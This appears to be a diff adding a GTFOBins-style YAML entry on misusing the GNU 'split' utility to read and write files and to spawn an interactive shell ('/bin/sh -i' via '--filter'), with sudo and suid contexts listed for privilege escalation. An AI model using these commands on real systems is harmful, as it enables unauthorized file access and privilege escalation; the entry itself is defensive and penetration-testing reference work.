@@ -1,0 +1,34 @@
+---
+functions:
+  file-read:
+  - code: |-
+      split -b 999 --additional-suffix suffix /path/to/input-file prefix
+      cat prefixaasuffix
+    comment: |-
+      This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    version: |-
+      The `--additional-suffix` flag is only available in the GNU version.
+  file-write:
+  - code: |-
+      split -b 999 --additional-suffix suffix /path/to/input-file prefix
+    comment: |-
+      This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    version: |-
+      The `--additional-suffix` flag is only available in the GNU version.
+  shell:
+  - code: |-
+      split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
